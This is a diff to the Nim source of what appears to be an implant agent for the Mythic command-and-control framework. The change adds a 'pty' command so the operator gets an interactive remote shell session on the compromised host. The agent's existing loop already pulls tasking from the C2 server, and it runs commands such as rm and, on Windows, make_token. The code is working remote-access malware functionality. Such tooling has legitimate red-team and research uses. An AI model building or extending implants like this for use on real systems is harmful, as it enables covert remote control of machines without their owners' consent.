@@ -17,6 +17,7 @@ import tasks/cd
 import tasks/ps
 import tasks/pwd
 import tasks/rm
+import tasks/pty
 
 # Windows-only commands
 when defined(windows):
@@ -147,8 +148,9 @@ proc checkin*(agent: Agent): bool =
   
   return false
 
-proc getTasks*(agent: Agent): seq[JsonNode] =
+proc getTasks*(agent: Agent): tuple[tasks: seq[JsonNode], interactive: seq[JsonNode]] =
   ## Get tasking from Mythic
+  ## Returns both tasks and interactive messages
   let getTaskingMsg = %*{
     "action": "get_tasking",
     "tasking_size": -1
@@ -157,9 +159,10 @@ proc getTasks*(agent: Agent): seq[JsonNode] =
   let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
   
   if response.len == 0:
-    return @[]
+    return (@[], @[])
   
   var tasks: seq[JsonNode] = @[]
+  var interactive: seq[JsonNode] = @[]
   
   try:
     let respJson = parseJson(response)
@@ -169,13 +172,30 @@ proc getTasks*(agent: Agent): seq[JsonNode] =
       if agent.config.debug:
         echo "[DEBUG] Received ", tasks.len, " task(s)"
     
-    return tasks
+    if respJson.hasKey("interactive"):
+      interactive = respJson["interactive"].getElems()
+      if agent.config.debug:
+        echo "[DEBUG] Received ", interactive.len, " interactive message(s)"
+    
+    return (tasks, interactive)
   except:
     if agent.config.debug:
       echo "[DEBUG] Failed to parse tasking: ", getCurrentExceptionMsg()
-    return @[]
+    return (@[], @[])
 
 
+
+proc processInteractive*(agent: var Agent, interactive: seq[JsonNode]) =
+  ## Process interactive messages (PTY input from Mythic)
+  for msg in interactive:
+    let taskId = msg["task_id"].getStr()
+    if agent.config.debug:
+      echo "[DEBUG] Processing interactive message for task ", taskId
+    
+    # Create array with single message for handler
+    let response = handlePtyInteractive(taskId, @[msg])
+    if response.len > 0:
+      agent.taskResponses.add(response)
 
 proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
   ## Process received tasks
@@ -444,6 +464,15 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           echo "[DEBUG] Executing rm command"
         response = rm(taskId, params)
       
+      of "pty":
+        if agent.config.debug:
+          echo "[DEBUG] Executing pty command"
+        response = pty(taskId, params)
+        # PTY sessions don't complete immediately
+        if response.hasKey("status") and response["status"].getStr() == "processing":
+          agent.taskResponses.add(response)
+          continue
+      
       of "make_token":
         when defined(windows):
           if agent.config.debug:
@@ -568,10 +597,35 @@ proc postResponses*(agent: var Agent) =
     echo "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
   
   # Separate interactive messages from regular responses
+  var regularResponses: seq[JsonNode] = @[]
+  var interactiveMessages: seq[JsonNode] = @[]
+  
+  for resp in agent.taskResponses:
+    if resp.hasKey("interactive"):
+      # Extract interactive messages and add to top-level array
+      let taskId = resp["task_id"].getStr()
+      let messages = resp["interactive"].getElems()
+      for msg in messages:
+        interactiveMessages.add(msg)
+      
+      # Don't add the response itself if it only has task_id and interactive
+      # (i.e., it's purely for interactive messages)
+      if resp.len > 2:  # More than just task_id and interactive
+        var cleanResp = resp.copy()
+        cleanResp.delete("interactive")
+        regularResponses.add(cleanResp)
+    else:
+      regularResponses.add(resp)
+  
+  # Build post_response message
   var postMsg = %*{
     "action": "post_response",
-    "responses": agent.taskResponses
+    "responses": regularResponses
   }
+  
+  # Add interactive messages at top level if any
+  if interactiveMessages.len > 0:
+    postMsg["interactive"] = %interactiveMessages
   
   let response = agent.profile.send($postMsg, agent.callbackUuid)
   
@@ -790,11 +844,19 @@ proc runAgent*() =
   
   # Main agent loop
   while not agentInstance.shouldExit:
-    # Get tasking from Mythic
-    let tasks = agentInstance.getTasks()
+    # Get tasking from Mythic (returns both tasks and interactive messages)
+    let (tasks, interactive) = agentInstance.getTasks()
+    
+    # Process interactive messages first (PTY input)
+    agentInstance.processInteractive(interactive)
     
     # Process tasks
     agentInstance.processTasks(tasks)
+    
+    # Check active PTY sessions for output (non-blocking via threads)
+    let ptyResponses = checkActivePtySessions()
+    for response in ptyResponses:
+      agentInstance.taskResponses.add(response)
     
     # Send responses back (handles background task state machine)
     agentInstance.postResponses()
